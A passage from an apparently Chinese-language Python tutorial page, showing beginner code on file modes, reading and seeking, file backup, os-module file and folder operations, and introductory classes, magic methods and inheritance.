class=\"line\">f.write(&#x27;bbb&#x27;)</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># a: 追加, 如果文件不存在，新建文件：在原有内容基础上，追加新内容</span><br><span class=\"line\">f = open(&#x27;2.txt&#x27;, &#x27;a&#x27;)</span><br><span class=\"line\">f.write(&#x27;xyz&#x27;)</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 访问模式参数可以省略，如果省略表示访问模式为r</span><br><span class=\"line\">f = open(&#x27;1.txt&#x27;)</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------读取函数之read--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># read()语法：文件对象.read(num)</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 文件内容如果换行，底层有\\n。会有字节占位，导致实际读取数据个数与参数不一致</span><br><span class=\"line\"># read()不写参数表示读取所有</span><br><span class=\"line\"># print(f.read())</span><br><span class=\"line\">print(f.read(10))</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------读取函数之readlines()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># readlines()可以按照行的方式把整个文件中的内容进行一次性读取，</span><br><span class=\"line\"># 并且返回的是一个列表，其中每一行的数据为一个元素</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">con = f.readlines()</span><br><span class=\"line\">print(con)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------读取函数之readline()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># readline()一次读取一行内容</span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">con = f.readline()</span><br><span class=\"line\">print(con)</span><br><span class=\"line\"></span><br><span class=\"line\">con = f.readline()</span><br><span class=\"line\">print(con)</span><br><span class=\"line\"></span><br><span class=\"line\">con = f.readline()</span><br><span class=\"line\">print(con)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------访问模式特点02--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">测试目标</span><br><span class=\"line\">1. r+ 和 w+ a+ 区别：r没有该文件则报错</span><br><span class=\"line\">2. 文件指针对数据读取的影响</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. r+: 没有该文件则报错，文件指针在开头</span><br><span class=\"line\"># f = open(&#x27;test1.txt&#x27;, &#x27;r+&#x27;)</span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;r+&#x27;)</span><br><span class=\"line\">con = f.read()</span><br><span class=\"line\">print(con)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. w+：没有该文件则新建文件，文件指针在开头，用新内容覆盖原内容</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;test1.txt&#x27;, &#x27;w+&#x27;)</span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;w+&#x27;)</span><br><span class=\"line\">con = f.read()</span><br><span class=\"line\">print(con)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 3. a+：没有该文件则新建文件，文件指针在结尾，无法读取数据（文件指针后面没有数据）</span><br><span class=\"line\"></span><br><span class=\"line\"># f = open(&#x27;test100.txt&#x27;, &#x27;a+&#x27;)</span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;a+&#x27;)</span><br><span class=\"line\">con = f.read()</span><br><span class=\"line\">print(con)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------seek函数--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 作用：用来移动文件指针</span><br><span class=\"line\"># 语法：文件对象.seek(偏移量，起始位置)</span><br><span class=\"line\"># 起始位置：0：文件开头；1：当前位置；2：文件结尾</span><br><span class=\"line\"># 目标：1. r 改变文件指针位置：改变读取数据开始位置或把文件指针放结尾（无法读取数据）</span><br><span class=\"line\">#      2. a 改变文件指针位置，做到可以读取出数据</span><br><span class=\"line\"></span><br><span class=\"line\"># f = open(&#x27;test.txt&#x27;, &#x27;r+&#x27;)</span><br><span class=\"line\">f = open(&#x27;test.txt&#x27;, &#x27;a+&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1.1 改变读取数据开始位置</span><br><span class=\"line\"># f.seek(2, 0)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1.2 把文件指针放结尾（无法读取数据）</span><br><span class=\"line\"># f.seek(0, 2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. a 改变文件指针位置，做到可以读取出数据</span><br><span class=\"line\"># f.seek(0, 0)</span><br><span class=\"line\">f.seek(0) # 省略偏移量，默认不偏移</span><br><span class=\"line\"></span><br><span class=\"line\">con = f.read()</span><br><span class=\"line\">print(con)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------文件备份--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 用户输入目标文件  sound.txt.mp3</span><br><span class=\"line\">old_name = input(&#x27;please input the file name you backup: &#x27;)</span><br><span class=\"line\"># print(old_name)</span><br><span class=\"line\"># print(type(old_name))</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 规划备份文件的名字</span><br><span class=\"line\"># 2.1 提取后缀 -- 找到名字中的点 -- 名字和后缀分离 --</span><br><span class=\"line\"># 最右侧的点才是后缀的点 -- 字符串查找某个字串rfind</span><br><span class=\"line\">index = old_name.rfind(&#x27;.&#x27;)</span><br><span class=\"line\"># print(index)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2.2 组织新名字 = 原名字 + [备份] + 后缀</span><br><span class=\"line\"># 原名字就是字符串中的一部分子串 -- 切片[开始:结束:步长]</span><br><span class=\"line\"># print(old_name[:index])</span><br><span class=\"line\"># print(old_name[index:])</span><br><span class=\"line\">new_name = old_name[:index] + &#x27;[backup]&#x27; + old_name[index:]</span><br><span class=\"line\">print(new_name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 备份文件写入数据（数据和原文件一样）</span><br><span class=\"line\"># 3.1 打开原文件和备份文件</span><br><span class=\"line\">old_f = open(old_name, &#x27;rb&#x27;)</span><br><span class=\"line\">new_f = open(new_name, &#x27;wb&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3.2 原文件读取，备份文件写入</span><br><span class=\"line\"># 如果不确定目标文件大小，循环读取写入，当读取出来的数据没有了则终止循环</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    con = old_f.read(1024)</span><br><span class=\"line\">    if len(con) == 0:</span><br><span class=\"line\">        # 读取完成</span><br><span class=\"line\">        break</span><br><span class=\"line\">    new_f.write(con)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3.3 关闭文件</span><br><span class=\"line\">old_f.close()</span><br><span class=\"line\">new_f.close()</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------文件备份之限制有效文件名备份--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">old_name = input(&#x27;please input the file name you backup: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">index = old_name.rfind(&#x27;.&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">if index &gt; 0:  # 判断文件是否有效</span><br><span class=\"line\">    postfix = old_name[index:]</span><br><span class=\"line\"></span><br><span class=\"line\">new_name = old_name[:index] + &#x27;[backup]&#x27; + postfix</span><br><span class=\"line\"></span><br><span class=\"line\">old_f = open(old_name, &#x27;rb&#x27;)</span><br><span class=\"line\">new_f = open(new_name, &#x27;wb&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    con = old_f.read(1024)</span><br><span class=\"line\">    if len(con) == 0:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    new_f.write(con)</span><br><span class=\"line\"></span><br><span class=\"line\">old_f.close()</span><br><span class=\"line\">new_f.close()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"文件与文件夹操作函数\"><a href=\"#文件与文件夹操作函数\" class=\"headerlink\" title=\"文件与文件夹操作函数\"></a>文件与文件夹操作函数</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------文件操作函数--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. 导入模块os</span><br><span class=\"line\">2. 使用模块内功能</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 1. rename(): 重命名</span><br><span class=\"line\"># os.rename(&#x27;文件操作函数.py&#x27;, &#x27;文件与文件夹操作函数.py&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. remove(): 删除文件</span><br><span class=\"line\">os.remove(&#x27;文件夹操作函数之创建和删除.py&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------文件夹操作函数之创建和删除--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. mkdir(): 创建文件夹</span><br><span class=\"line\"># os.mkdir(&#x27;aa&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. rmdir(): 删除文件夹</span><br><span class=\"line\"># os.rmdir(&#x27;aa&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------文件夹操作函数之路径相关函数--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. getcwd(): 返回当前文件所在目录路径</span><br><span class=\"line\"># print(os.getcwd())</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. chdir(): 改变目录路径</span><br><span class=\"line\"># os.mkdir(&#x27;aa&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求： 在aa里面创建bb文件夹：1. 切换目录到aa. 2. 创建bb</span><br><span class=\"line\"># os.chdir(&#x27;aa&#x27;)</span><br><span class=\"line\"># os.mkdir(&#x27;bb&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. listdir(): 获取某个文件夹下所有文件，返回一个列表</span><br><span class=\"line\">print(os.listdir())</span><br><span class=\"line\">print(os.listdir(&#x27;aa&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------文件夹操作函数之rename()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># os.rename() -- 重命名文件夹，bb重命名为bbbb</span><br><span class=\"line\">os.chdir(&#x27;aa&#x27;)</span><br><span class=\"line\">os.rename(&#x27;bb&#x27;, &#x27;bbbb&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------批量重命名之添加字符串-------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求1：把&quot;code\\4\\aa&quot;文件夹下的所有文件重命名 python xxxx</span><br><span class=\"line\"># 1. 找到所有文件：获取该文件夹的目录列表 -- listdir()</span><br><span class=\"line\">os.chdir(&#x27;aa&#x27;)</span><br><span class=\"line\">file_list = os.listdir()</span><br><span class=\"line\">print(file_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 构造名字</span><br><span class=\"line\">for i in file_list:</span><br><span class=\"line\">    new_name = &#x27;python_&#x27; + i</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 重命名</span><br><span class=\"line\">    os.rename(i, new_name)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------批量重命名之添加和删除字符串-------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求2： 删除pyton_重命名：1. 构造条件的数据 2. 书写if</span><br><span class=\"line\"></span><br><span class=\"line\"># 构造条件的数据</span><br><span class=\"line\">flag = 2</span><br><span class=\"line\"></span><br><span class=\"line\">os.chdir(&#x27;aa&#x27;)</span><br><span class=\"line\">file_list = os.listdir()</span><br><span class=\"line\">print(file_list)</span><br><span class=\"line\"></span><br><span class=\"line\">for i in file_list:</span><br><span class=\"line\">    if flag == 1:</span><br><span class=\"line\">        new_name = &#x27;python_&#x27; + i</span><br><span class=\"line\"></span><br><span class=\"line\">    elif flag == 2:</span><br><span class=\"line\">        num = len(&#x27;python_&#x27;)</span><br><span class=\"line\">        new_name = i[num:]</span><br><span class=\"line\">    os.rename(i, new_name)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"体验面向对象\"><a href=\"#体验面向对象\" class=\"headerlink\" title=\"体验面向对象\"></a>体验面向对象</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 需求：洗衣机，功能：洗衣服</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 定义洗衣机类</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">class 类名():</span><br><span class=\"line\">    代码</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def wash(self):</span><br><span class=\"line\">        print(&#x27;wash clothes&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建对象</span><br><span class=\"line\"># 对象名 = 类名（）</span><br><span class=\"line\">haier = washer()</span><br><span class=\"line\"></span><br><span class=\"line\"># 3. 验证成果</span><br><span class=\"line\"># 打印haier对象</span><br><span class=\"line\">print(haier)</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用wash功能 -- 实例方法/对象方法 -- 对象名.wash()</span><br><span class=\"line\">haier.wash()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"类里面的self\"><a href=\"#类里面的self\" class=\"headerlink\" title=\"类里面的self\"></a>类里面的self</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 类：洗衣机 功能：洗衣服</span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def wash(self):</span><br><span class=\"line\">        print(&#x27;wash clothes&#x27;)</span><br><span class=\"line\">        print(self)</span><br><span class=\"line\"></span><br><span class=\"line\">haier = washer()</span><br><span class=\"line\">print(haier)</span><br><span class=\"line\">haier.wash()</span><br><span class=\"line\"></span><br><span class=\"line\"># 由于打印对象和打印self得到的内存地址相同，因此self指的是调用该函数的对象</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"一个类创建多个对象\"><a href=\"#一个类创建多个对象\" class=\"headerlink\" title=\"一个类创建多个对象\"></a>一个类创建多个对象</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1. 一个类可以创建多个对象；2. 多个对象都调用函数的时候，self地址不相同</span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def wash(self):</span><br><span class=\"line\">        print(&#x27;wash clothes&#x27;)</span><br><span class=\"line\">        print(self)</span><br><span class=\"line\"></span><br><span class=\"line\">haier1 = washer()</span><br><span class=\"line\">haier1.wash()</span><br><span class=\"line\"></span><br><span class=\"line\">haier2 = washer()</span><br><span class=\"line\">haier2.wash()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"添加和获取对象属性\"><a href=\"#添加和获取对象属性\" class=\"headerlink\" title=\"添加和获取对象属性\"></a>添加和获取对象属性</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;-----------------类外面添加和获取对象属性--------------&#x27;)</span><br><span class=\"line\"># 属性既是特征，例如洗衣机的宽度，高度等</span><br><span class=\"line\"></span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def wash(self):</span><br><span class=\"line\">        print(&#x27;wash clothes&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">haier1 = washer()</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加对象属性 -- 对象名.属性名 = 值</span><br><span class=\"line\">haier1.width = 400</span><br><span class=\"line\">haier1.height = 500</span><br><span class=\"line\"></span><br><span class=\"line\"># 获取对象属性 -- 对象名.属性名</span><br><span class=\"line\">print(f&#x27;the width of the washer is &#123;haier1.width&#125;&#x27;)</span><br><span class=\"line\">print(f&#x27;the height of the washer is &#123;haier1.height&#125;&#x27;)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------类里面获取对象属性--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 语法：self.属性名</span><br><span class=\"line\"></span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def wash(self):</span><br><span class=\"line\">        print(&#x27;wash clothes&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 获取对象属性</span><br><span class=\"line\">    def print_info(self):</span><br><span class=\"line\">        # self.属性名</span><br><span class=\"line\">        print(f&#x27;the width of the washer is &#123;self.width&#125;&#x27;)</span><br><span class=\"line\">        print(f&#x27;the height of the washer is &#123;self.height&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">haier1 = washer()</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加对象属性 -- 对象名.属性名 = 值</span><br><span class=\"line\">haier1.width = 400</span><br><span class=\"line\">haier1.height = 500</span><br><span class=\"line\"></span><br><span class=\"line\"># 对象调用方法</span><br><span class=\"line\">haier1.print_info()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"魔法方法\"><a href=\"#魔法方法\" class=\"headerlink\" title=\"魔法方法\"></a>魔法方法</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 在python中， _xx_()的函数叫做魔法方法，指的是具有特殊功能的函数</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------魔法方法之__init__()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># _init_()方法的作用：初始化对象</span><br><span class=\"line\"></span><br><span class=\"line\"># 目标：定义init魔法方法设置初始化属性，并访问调用</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\">1. 定义类</span><br><span class=\"line\">    init魔法方法: width 和 height</span><br><span class=\"line\">    添加实例方法：访问实例属性</span><br><span class=\"line\">    </span><br><span class=\"line\">2. 创建对象</span><br><span class=\"line\">3. 验证成果</span><br><span class=\"line\">    调用实例方法</span><br><span class=\"line\">&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        # 添加实例属性</span><br><span class=\"line\">        self.width = 500</span><br><span class=\"line\">        self.height = 800</span><br><span class=\"line\"></span><br><span class=\"line\">    def print_info(self):</span><br><span class=\"line\">        print(f&#x27;&#123;self.width&#125;&#x27;)</span><br><span class=\"line\">        print(f&#x27;&#123;self.height&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">haier = washer()</span><br><span class=\"line\">haier.print_info()</span><br><span class=\"line\"></span><br><span class=\"line\"># 注意：1. init_()方法，在创建一个对象是默认被调用，不需要手动调用，</span><br><span class=\"line\">#      2. init_(self)的self参数，不需要开发者传递，python解释器会自动把当前的对象引用传递过去</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------魔法方法之带参数的__init__()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 1. 定义类：带参数的init：宽度和高度：实例方法：调用实例属性</span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def __init__(self, width, height):</span><br><span class=\"line\">        self.width = width</span><br><span class=\"line\">        self.height = height</span><br><span class=\"line\"></span><br><span class=\"line\">    def print_info(self):</span><br><span class=\"line\">        print(f&#x27;&#123;self.width&#125;&#x27;)</span><br><span class=\"line\">        print(f&#x27;&#123;self.height&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建对象: 创建多个对象且属性值不同：调用实例方法</span><br><span class=\"line\">haier1 = washer(10, 20)</span><br><span class=\"line\">haier1.print_info()</span><br><span class=\"line\"></span><br><span class=\"line\">haier2 = washer(100, 200)</span><br><span class=\"line\">haier2.print_info()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------魔法方法之__str__()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># _str_()方法的作用：当使用print输出对象的时候，默认打印对象的内存地址。</span><br><span class=\"line\"># 如果类定义了__str__方法，那么就会打印从这个方法中return的数据</span><br><span class=\"line\"></span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.width = 300</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return &#x27;解释说明：类的说明或对象状态的说明&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">haier = washer()</span><br><span class=\"line\">print(haier)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-----------------魔法方法之__del__()--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 当删除对象时，python解释器也会默认调用__del__方法</span><br><span class=\"line\"></span><br><span class=\"line\">class washer():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.width = 300</span><br><span class=\"line\"></span><br><span class=\"line\">    def __del__(self):</span><br><span class=\"line\">        print(&#x27;the object was deleted&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">haier = washer()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"综合案例之烤地瓜\"><a href=\"#综合案例之烤地瓜\" class=\"headerlink\" title=\"综合案例之烤地瓜\"></a>综合案例之烤地瓜</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1. 定义类：初始化属性、被烤和添加调料的方法、显示对象信息的str</span><br><span class=\"line\">class SweetPotato():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        # 被烤的时间</span><br><span class=\"line\">        self.cooktime = 0</span><br><span class=\"line\">        # 烤的状态</span><br><span class=\"line\">        self.cookstate = &#x27;raw&#x27;</span><br><span class=\"line\">        # 调料列表</span><br><span class=\"line\">        self.condiments = []</span><br><span class=\"line\"></span><br><span class=\"line\">    def cook(self, time):</span><br><span class=\"line\">        &quot;&quot;&quot;烤地瓜方法&quot;&quot;&quot;</span><br><span class=\"line\">        # 1. 先计算地瓜整体烤过的时间</span><br><span class=\"line\">        self.cooktime += time</span><br><span class=\"line\">        # 2. 用整体烤过的时间再判断地瓜的状态</span><br><span class=\"line\">        if 0 &lt;= self.cooktime &lt; 3:</span><br><span class=\"line\">            # 生的</span><br><span class=\"line\">            self.cookstate = &#x27;raw&#x27;</span><br><span class=\"line\">        elif 3 &lt;= self.cooktime &lt; 5:</span><br><span class=\"line\">            # 半生不熟</span><br><span class=\"line\">            self.cookstate = &#x27;half-cooked&#x27;</span><br><span class=\"line\">        elif 5 &lt;= self.cooktime &lt; 8:</span><br><span class=\"line\">            # 熟了</span><br><span class=\"line\">            self.cookstate = &#x27;cooked&#x27;</span><br><span class=\"line\">        elif self.cooktime &gt;= 8:</span><br><span class=\"line\">            # 烤糊了</span><br><span class=\"line\">            self.cookstate = &#x27;overcooked&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def add_condiments(self, condiment):</span><br><span class=\"line\">        &quot;&quot;&quot;添加调料方法&quot;&quot;&quot;</span><br><span class=\"line\">        # 用户意愿的调料追加到调料列表</span><br><span class=\"line\">        self.condiments.append(condiment)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return f&#x27;this sweet potato has been cooked for &#123;self.cooktime&#125; minutes, &#x27; \\</span><br><span class=\"line\">               f&#x27;\\nand it\\&#x27;s cook state is &#123;self.cookstate&#125;, &#x27; \\</span><br><span class=\"line\">               f&#x27;\\ncondiments contains &#123;self.condiments&#125;\\n&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 创建对象并调用对应的实例方法</span><br><span class=\"line\"></span><br><span class=\"line\">digua1 = SweetPotato()</span><br><span class=\"line\">print(digua1)</span><br><span class=\"line\"></span><br><span class=\"line\">digua1.cook(2)</span><br><span class=\"line\">digua1.add_condiments(&#x27;chili power&#x27;)</span><br><span class=\"line\">print(digua1)</span><br><span class=\"line\"></span><br><span class=\"line\">digua1.cook(2)</span><br><span class=\"line\">digua1.add_condiments(&#x27;soy sauce&#x27;)</span><br><span class=\"line\">print(digua1)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"综合案例之搬家具\"><a href=\"#综合案例之搬家具\" class=\"headerlink\" title=\"综合案例之搬家具\"></a>综合案例之搬家具</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 定义家具类</span><br><span class=\"line\">class Furniture():</span><br><span class=\"line\">    def __init__(self, name, area):</span><br><span class=\"line\">        # 家具名字</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        # 家具占地面积</span><br><span class=\"line\">        self.area = area</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义房屋类</span><br><span class=\"line\">class Home():</span><br><span class=\"line\">    def __init__(self, address, area):</span><br><span class=\"line\">        # 地理位置</span><br><span class=\"line\">        self.address = address</span><br><span class=\"line\">        # 房屋面积</span><br><span class=\"line\">        self.area = area</span><br><span class=\"line\">        # 剩余面积</span><br><span class=\"line\">        self.free_area = area</span><br><span class=\"line\">        # 家具列表</span><br><span class=\"line\">        self.furniture = []</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return f&#x27;the house\\&#x27;s position is &#123;self.address&#125;, its area is &#123;self.area&#125;, &#x27; \\</span><br><span class=\"line\">               f&#x27;\\nits free area is &#123;self.free_area&#125;, &#x27; \\</span><br><span class=\"line\">               f&#x27;\\nthe furniture includes &#123;self.furniture&#125;\\n&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    def add_furniture(self, item):</span><br><span class=\"line\">        &quot;&quot;&quot;容纳家具&quot;&quot;&quot;</span><br><span class=\"line\">        # 如果 家具占地面积 &lt;= 房子剩余面积：可以搬入（家具列表添加家具名字数据并更新房子剩余面积</span><br><span class=\"line\">        # 房屋剩余面积 - 该家具的占地面积</span><br><span class=\"line\">        # 否则：提示用户家具太大，剩余面积不足，无法容纳）</span><br><span class=\"line\">        if item.area &lt;= self.free_area:</span><br><span class=\"line\">            self.furniture.append(item.name)</span><br><span class=\"line\">            self.free_area -= item.area</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&#x27;the furniture is too big to place, free area is not enough&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 双人床， 6</span><br><span class=\"line\">bed = Furniture(&#x27;double bed&#x27;, 6)</span><br><span class=\"line\"># 沙发，10</span><br><span class=\"line\">sofa = Furniture(&#x27;sofa&#x27;, 10)</span><br><span class=\"line\"></span><br><span class=\"line\"># 房子1：北京，1000</span><br><span class=\"line\">jia1 = Home(&#x27;Peking&#x27;, 1000)</span><br><span class=\"line\">print(jia1)</span><br><span class=\"line\"></span><br><span class=\"line\">jia1.add_furniture(bed)</span><br><span class=\"line\">print(jia1)</span><br><span class=\"line\"></span><br><span class=\"line\">ball = Furniture(&#x27;basketball court&#x27;, 2000)</span><br><span class=\"line\">jia1.add_furniture(ball)</span><br><span class=\"line\">print(jia1)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"面向对象之继承\"><a href=\"#面向对象之继承\" class=\"headerlink\" title=\"面向对象之继承\"></a>面向对象之继承</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;-----------------体验继承--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 继承：子类默认继承父类的所有属性和方法</span><br><span class=\"line\"># 1. 定义父类</span><br><span class=\"line\">class A(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.num = 1</span><br><span class=\"line\"></span><br><span class=\"line\">    def print_info(self):</span><br><span class=\"line\">        print(self.num)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2. 定义子类，继承父类</span><br><span class=\"line\">class B(A):</span><br><span 